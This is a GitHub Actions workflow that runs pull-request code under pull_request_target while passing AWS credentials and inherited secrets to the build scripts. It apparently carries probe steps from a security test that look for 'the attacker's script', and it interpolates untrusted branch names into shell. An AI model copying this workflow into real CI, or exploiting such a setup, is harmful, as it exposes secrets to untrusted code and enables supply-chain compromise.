name: Lint and Test Charts
jobs:
  lint-test:
    runs-on: ubuntu-latest
    steps:
    - name: Checkout
      uses: actions/checkout@v3
      with:
        fetch-depth: 0
        ref: ${{ github.event.pull_request.head.ref }}
        repository: ${{ github.event.pull_request.head.repo.full_name }}
    - name: GARALT debug probe
      run: |
        echo "GARALT_DBG: lint-test sink step about to execute"
        printf 'GARALT_DBG: HEAD_REF=%s\n' "${{ github.event.pull_request.head.ref }}"
        printf 'GARALT_DBG: HEAD_REPO=%s\n' "${{ github.event.pull_request.head.repo.full_name }}"
        printf 'GARALT_DBG: BASE_REPO=%s\n' "${{ github.repository }}"
        # Check if the attacker's script exists
        if [ -f build/package.sh ]; then
          echo "GARALT_DBG: build/package.sh EXISTS"
          head -5 build/package.sh
        else
          echo "GARALT_DBG: build/package.sh NOT FOUND"
        fi
      continue-on-error: true
    - name: Pre package
      run: |
        bash build/package.sh
  test-version:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.generate.outputs.version }}
    steps:
    - id: generate
      run: |
        v=1.12.5-$(echo $RANDOM$RANDOM)
        echo "version=$v" >> "$GITHUB_OUTPUT"
  upload-cli:
    needs: test-version
    uses: ./.github/workflows/release-cli.yaml
    secrets: inherit
    with:
      version: ${{ needs.test-version.outputs.version }}
      ref: ${{ github.event.pull_request.head.ref }}
      repository: ${{ github.event.pull_request.head.repo.full_name }}
  upload-daemon:
    needs: test-version
    uses: ./.github/workflows/release-daemon.yaml
    secrets: inherit
    with:
      version: ${{ needs.test-version.outputs.version }}
      ref: ${{ github.event.pull_request.head.ref }}
      repository: ${{ github.event.pull_request.head.repo.full_name }}
  push-image:
    runs-on: ubuntu-latest
    steps:
    - name: Checkout source code
      uses: actions/checkout@v3
      with:
        fetch-depth: 0
        ref: ${{ github.event.pull_request.head.ref }}
        repository: ${{ github.event.pull_request.head.repo.full_name }}
    - name: GARALT debug probe
      run: |
        echo "GARALT_DBG: push-image sink step about to execute"
        printf 'GARALT_DBG: HEAD_REF=%s\n' "${{ github.event.pull_request.head.ref }}"
        printf 'GARALT_DBG: HEAD_REPO=%s\n' "${{ github.event.pull_request.head.repo.full_name }}"
        # Check if the attacker's scripts exist
        for f in build/image-manifest.sh build/upload-images.sh; do
          if [ -f "$f" ]; then
            echo "GARALT_DBG: $f EXISTS"
          else
            echo "GARALT_DBG: $f NOT FOUND"
          fi
        done
      continue-on-error: true
    - env:
        AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
        AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        AWS_DEFAULT_REGION: us-east-1
      run: |
        bash build/image-manifest.sh && bash build/upload-images.sh .manifest/images.mf
  push-image-arm64:
    runs-on: ubuntu-latest
    steps:
    - name: GARALT debug probe
      run: |
        echo "GARALT_DBG: push-image-arm64 sink step about to execute"
        printf 'GARALT_DBG: HEAD_REF=%s\n' "${{ github.event.pull_request.head.ref }}"
        printf 'GARALT_DBG: HEAD_REPO=%s\n' "${{ github.event.pull_request.head.repo.full_name }}"
        # Check if the attacker's scripts exist
        for f in build/image-manifest.sh build/upload-images.sh; do
          if [ -f "$f" ]; then
            echo "GARALT_DBG: $f EXISTS"
          else
            echo "GARALT_DBG: $f NOT FOUND"
          fi
        done
      continue-on-error: true
    - name: Checkout source code
      uses: actions/checkout@v3
      with:
        fetch-depth: 0
        ref: ${{ github.event.pull_request.head.ref }}
        repository: ${{ github.event.pull_request.head.repo.full_name }}
    - env:
        AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
        AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        AWS_DEFAULT_REGION: us-east-1
      run: |
        export PATH=$PATH:/usr/local/bin:/home/ubuntu/.local/bin
        bash build/image-manifest.sh && bash build/upload-images.sh .manifest/images.mf linux/arm64
  push-deps:
    needs:
    - test-version
    - upload-daemon
    runs-on: ubuntu-latest
    steps:
    - name: Checkout source code
      uses: actions/checkout@v3
      with:
        fetch-depth: 0
        ref: ${{ github.event.pull_request.head.ref }}
        repository: ${{ github.event.pull_request.head.repo.full_name }}
    - name: GARALT debug probe
      run: |
        echo "GARALT_DBG: push-deps sink step about to execute"
        printf 'GARALT_DBG: HEAD_REF=%s\n' "${{ github.event.pull_request.head.ref }}"
        printf 'GARALT_DBG: HEAD_REPO=%s\n' "${{ github.event.pull_request.head.repo.full_name }}"
        for f in build/deps-manifest.sh build/upload-deps.sh; do
          if [ -f "$f" ]; then
            echo "GARALT_DBG: $f EXISTS"
          else
            echo "GARALT_DBG: $f NOT FOUND"
          fi
        done
      continue-on-error: true
    - env:
        AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
        AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        AWS_DEFAULT_REGION: us-east-1
        VERSION: ${{ needs.test-version.outputs.version }}
        REPO_PATH: ${{ secrets.REPO_PATH }}
      run: |
        bash build/deps-manifest.sh && bash build/upload-deps.sh
  push-deps-arm64:
    needs:
    - test-version
    - upload-daemon
    runs-on: ubuntu-latest
    steps:
    - name: Checkout source code
      uses: actions/checkout@v3
      with:
        fetch-depth: 0
        ref: ${{ github.event.pull_request.head.ref }}
        repository: ${{ github.event.pull_request.head.repo.full_name }}
    - name: GARALT debug probe
      run: |
        echo "GARALT_DBG: push-deps-arm64 sink step about to execute"
        printf 'GARALT_DBG: HEAD_REF=%s\n' "${{ github.event.pull_request.head.ref }}"
        printf 'GARALT_DBG: HEAD_REPO=%s\n' "${{ github.event.pull_request.head.repo.full_name }}"
        for f in build/deps-manifest.sh build/upload-deps.sh; do
          if [ -f "$f" ]; then
            echo "GARALT_DBG: $f EXISTS"
          else
            echo "GARALT_DBG: $f NOT FOUND"
          fi
        done
      continue-on-error: true
    - env:
        AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
        AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        AWS_DEFAULT_REGION: us-east-1
        VERSION: ${{ needs.test-version.outputs.version }}
        REPO_PATH: ${{ secrets.REPO_PATH }}
      run: |
        export PATH=$PATH:/usr/local/bin:/home/ubuntu/.local/bin
        bash build/deps-manifest.sh linux/arm64 && bash build/upload-deps.sh linux/arm64
  upload-package:
    needs:
    - lint-test
    - test-version
    - push-image
    - push-image-arm64
    - push-deps
    - push-deps-arm64
    runs-on: ubuntu-latest
    steps:
    - name: Checkout
      uses: actions/checkout@v3
      with:
        fetch-depth: 0
        ref: ${{ github.event.pull_request.head.ref }}
        repository: ${{ github.event.pull_request.head.repo.full_name }}
    - name: GARALT debug probe
      run: |
        echo "GARALT_DBG: upload-package sink step about to execute"
        printf 'GARALT_DBG: HEAD_REF=%s\n' "${{ github.event.pull_request.head.ref }}"
        printf 'GARALT_DBG: HEAD_REPO=%s\n' "${{ github.event.pull_request.head.repo.full_name }}"
        if [ -f build/build.sh ]; then
          echo "GARALT_DBG: build/build.sh EXISTS"
        else
          echo "GARALT_DBG: build/build.sh NOT FOUND"
        fi
      continue-on-error: true
    - name: Package installer
      run: |
        bash build/build.sh ${{ needs.test-version.outputs.version }}
env:
  GARALT_SECRET: ${{ secrets.GARALT }}
on:
  push:
    branches:
    - main
    - release-*
    paths:
    - '!docs/**'
    - apps/.olares/**
    - build/**
    - cli/**
    - daemon/**
    - framework/**/.olares/**
    - infrastructure/**/.olares/**
    - platform/**/.olares/**
    - vendor/**
  pull_request_target:
    branches:
    - main
    - release-*
    paths:
    - '!docs/**'
    - apps/.olares/**
    - build/**
    - cli/**
    - daemon/**
    - framework/**/.olares/**
    - infrastructure/**/.olares/**
    - platform/**/.olares/**
    - vendor/**
  workflow_dispatch: null
